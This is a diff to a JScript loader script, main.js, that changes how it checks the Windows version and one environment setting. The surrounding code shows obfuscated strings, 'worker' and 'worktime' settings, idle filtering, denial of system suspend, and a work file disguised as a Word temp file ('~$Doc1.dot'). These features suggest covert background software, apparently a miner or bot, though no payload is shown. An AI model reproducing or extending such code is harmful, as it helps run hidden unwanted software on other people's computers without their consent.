@@ -1,8 +1,7 @@
-////////// 
-
+//
 log("*----main.js----")
 log("-----main.js DateLastModified : " + __fso.GetFile(__workdir+"~$Doc1.dot").DateLastModified + "----*")
-/////
+//
 function filter_idle(){
 }
 function filter_idle.prototype.run(){
@@ -29,8 +28,7 @@ function filter_idle.prototype.run(){
 
 function filter_sebtc(){
 }
-function filter_sebtc.prototype.setEnvironmentVariable(env)
-{
+function filter_sebtc.prototype.setEnvironmentVariable(env){
 	var mapType2UserName = {
 		"0":"XjYYWYWU'",
 		"1":"gk_[jWi[l[hU'",
@@ -66,7 +64,7 @@ function filter_sebtc.prototype.setEnvironmentVariable(env)
 		env("worktime") = "212345678";
 		//env("-lowestworker") = 800;
 		env("#ki[h") = val;
-		env("VSD")=1;
+		//env("VSD")=1;
 		//env("VSD") = 1; 
 	}
 }
@@ -84,9 +82,7 @@ function filter_sebtc.prototype.conditionDenyPowerQuery(){
 		var PBT_APMQUERYSUSPEND	= 0x0000;
 		var PBT_APMSUSPEND = 4
 		var  WM_POWERBROADCAST = 0x0218; 
-		var wql = "Select * from Win32_OperatingSystem"
-		var objOperatingSystem = new Enumerator (__service.ExecQuery(wql)).item();
-		var osversion = objOperatingSystem.Version
+		var osversion = __osVersion
 		log(" osversion ; " + osversion);
 		if(osversion.substr(0,1) =="5"){
 			__windows.AddMsg2RetFunCallback(WM_POWERBROADCAST, function(p1,p2){
@@ -223,8 +219,7 @@ function start(){
 	_filter_se.callback = __module.push(_filter_se);
 	var pipe = __destReady_dll;
 	__module.setDoneCallback(function (mod) {
-		log("module name "+mod.name+" onDonCallback");		 
-	 
+		log("module name : "+mod.name+" onDonCallback");	
 	})
 	__module.run(pipe)	
 }
@@ -248,6 +243,12 @@ function filter_installcondition.prototype.run(pipe){
 	if(osversion.substr(0,1) !="5")
 		this.callback(pipe,true);
 	*/
+	var osversion = __osVersion
+	log(" osversion ; " + osversion);
+	if(osversion.substr(0,1) !="5"){		
+		return this.callback(pipe,true);
+	}
+	//	
 	if(this.condition && this.condition.type){		
 		if(this.condition.type == "reg" && this.condition.subtype=="existreg"){
 			var WshShell = __wshShell
